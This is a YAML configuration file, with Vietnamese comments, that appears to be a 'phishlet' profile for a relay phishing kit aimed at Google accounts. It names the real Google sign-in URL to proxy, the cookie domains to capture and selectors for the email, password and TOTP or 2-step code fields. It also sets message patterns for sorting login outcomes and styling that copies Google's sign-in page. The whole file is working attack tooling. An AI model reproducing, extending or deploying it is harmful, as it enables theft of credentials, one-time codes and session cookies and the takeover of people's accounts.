# google.yaml — relay profile cho Google (flow chuyên dụng, KHÔNG đổi hành vi)
# flow: google giữ nguyên state machine số hữu của bgrelay (identifier →
# password → totpPin/number-match prompt → done mail.google.com).
phishlet: google
flow: google
signin_url: "https://accounts.google.com/ServiceLogin?hl={hl}&continue=https%3A%2F%2Fmail.google.com%2F"
done_hosts: ["mail.google.com", "myaccount.google.com"]
cookie_domains: ["google.com"]
asset_hosts: ["gstatic.com", "googleapis.com", "googleusercontent.com", "google.com", "google.vn"]
reopen_url: "https://mail.google.com"
inputs:            # thứ tự ưu tiên detect (password trước, như INPUT_SELS cũ)
  password: "input[name='Passwd'], input[type='password']"
  email: "#identifierId"
  code: "input[name='totpPin'], input[type='tel']"
buttons:
  next: ["#identifierNext button", "#passwordNext button", "#totpNext button", "button:has-text('Next')"]
classify:
  challenge: ["enter a code", "nhập mã", "mã xác minh", "verify it", "2-step", "xác minh 2 bước"]
  bad_account: ["couldn't find", "couldn’t find", "không tìm thấy"]
  wrong_password: ["wrong password", "mật khẩu không chính xác"]
  botguard: ["not be secure", "không an toàn"]
page:
  title: "Sign in - Google Accounts"
  favicon: "data:image/svg+xml;base64,"
  button_label: "Next"
  accent: "#0b57d0"
  text: "#202124"
  muted: "#5f6368"
  line: "#dadce0"
  card_radius: 24
  footer_left: "English (United States)"
  footer_right: "Help   Privacy   Terms"
